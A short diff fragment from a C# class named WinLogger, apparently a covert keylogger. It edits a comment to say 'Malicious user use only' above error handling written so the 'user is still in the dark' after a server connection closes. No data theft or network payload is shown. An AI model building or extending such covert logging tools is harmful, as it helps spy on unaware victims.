@@ -114,7 +114,7 @@ public class WinLogger
                 server.Close();
             } catch (Exception e) {
                 /* If something goes wrong, oh well. At least user is still in the dark.
-                    Uncomment below line for debugging exceptions. */
+                    Uncomment below line for debugging exceptions. (Malicious user use only!!!)*/
                 //File.AppendAllText(@"C:\Users\IEUser\Downloads\exceptions.txt", e.ToString());
             }
         } catch (Exception) {}
